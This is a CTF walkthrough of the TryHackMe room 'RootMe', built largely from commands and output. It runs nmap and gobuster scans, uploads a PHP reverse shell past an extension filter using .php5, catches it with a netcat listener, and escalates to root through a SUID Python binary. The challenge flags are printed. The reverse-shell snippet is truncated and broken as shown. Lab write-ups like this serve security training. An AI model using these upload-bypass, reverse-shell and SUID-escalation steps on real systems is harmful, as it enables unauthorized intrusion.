# Rootme

[RootMe](https://tryhackme.com/room/rrootme) is a TryHackMe CTF. 

- Linux

## Recon

### Nmap

Scan the box for open ports, enumerate services, get Apache version.

- SSH 22
    - 7.6p1
- HTTP 80 
    - Apache httpd 2.4.29 ((Ubuntu))

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/root-me$ nmap -A  10.10.193.72 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 20:15 BST
Nmap scan report for 10.10.193.72
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
```
### Browse to site

Nice fancy web page; just JS effects on front end.

Brandishes slogan:
> root@rootme:~#
> Can you root me?

Nothing interesting in homepage pagesource.

No `robots.txt` nor `sitemap.xmp` file for directory hints.

### GoBuster 

Automated directory enumeration as little to no manual found hints.

- /panel
- /uploads


```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/root-me$ gobuster dir -u http://10.10.193.72 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.193.72
[+] Threads:        50
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 20:19:36 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/09/28 20:19:43 Finished                                                
===============================================================
```

## Gaining access/exploitation

### Test uploads

Site allows uploads via `/panel`, can access uploads via `/uploads` directory.

Testing upload with a simple `.txt` file first.

Upload words. 

After upload, page source shows the url to access new upload.

### Generate reverse shell

Web server is running Apache, therefore can use PHP reverse shell.

```php
<?php
    system('rm /tmp/f; ')
?>
```

### Attempt upload

Upload panel does not allow .php uploads; can try to bypass with different PHP extensions.

```shell
.php    ## Fails.
.php5   ## This one works..

.php4   ## didn't bother trying
.phtml  ## ..
```

Once reverse shell uploaded, execute by browsing to site. But start `nc -lvp 4444` listener first.

### Start netcat listener

```shell
nc -lvp 4444
```
### Execute reverse shell

Browse to the uploaded file in browser. On execute, the PHP file will create netcat connection on attacker machine.

### Gain shell

Got shell as `www-data`.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/root-me$ nc -lvp 4444
listening on [any] 4444 ...
10.10.193.72: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.193.72] 38060
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### Find user flag

User flag is in `/var/www`.

```shell
$ pwd
/var/www

$ ls -lah
total 20K
drwxr-xr-x  3 www-data www-data 4.0K Aug  4 17:54 .
drwxr-xr-x 14 root     root     4.0K Aug  4 15:08 ..
-rw-------  1 www-data www-data  129 Aug  4 17:54 .bash_history
drwxr-xr-x  6 www-data www-data 4.0K Aug  4 17:19 html
-rw-r--r--  1 www-data www-data   21 Aug  4 17:30 user.txt

$ cat user.txt
THM{y0u_g0t_a_sh3ll}
```

## Root privesc

### Find other users

Two users in `/home` directory
- rootme
- test

```shell
$ cd /home
$ ls -lah
total 16K
drwxr-xr-x  4 root   root   4.0K Aug  4 17:33 .
drwxr-xr-x 24 root   root   4.0K Aug  4 14:54 ..
drwxr-xr-x  4 rootme rootme 4.0K Aug  4 17:07 rootme
drwxr-xr-x  3 test   test   4.0K Aug  4 17:54 test
```

Pulled `passwd` file

```shell
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
rootme:x:1000:1000:RootMe:/home/rootme:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
test:x:1001:1001:,,,:/home/test:/bin/bash
```

### Upgrade shell

Spawned Python PTY shell so can run `sudo -l`. However, www-data is password protected.

```
python -c 'import pty; pty.spawn("/bin/sh")' 
```

### Attempt to login as other users

Both users are password protected, and cannot freely `su test` nor `su rootme`.

### Find other files with SUID

Quite a few wierd files with SUID perm, but `/usr/bin/python` stood as most worrying.

```shell
www-data@rootme:/etc$ find / -type f -perm /4000 2>/dev/null
find / -type f -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

### Escalate privileges with SUID python

As Python has SUID, we can use it to spawn an `-p` privileged shell.

```shell
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Get root flag

```shell
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# who
who
# whoami
whoami
root
# cd /root
cd /root
# ls -lah
ls -lah
total 40K
drwx------  6 root root 4.0K Aug  4 17:54 .
drwxr-xr-x 24 root root 4.0K Aug  4 14:54 ..
-rw-------  1 root root 1.4K Aug  4 17:54 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Aug  4 17:08 .cache
drwx------  3 root root 4.0K Aug  4 17:08 .gnupg
drwxr-xr-x  3 root root 4.0K Aug  4 16:26 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4.0K Aug  4 15:03 .ssh
-rw-r--r--  1 root root   26 Aug  4 17:31 root.txt
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```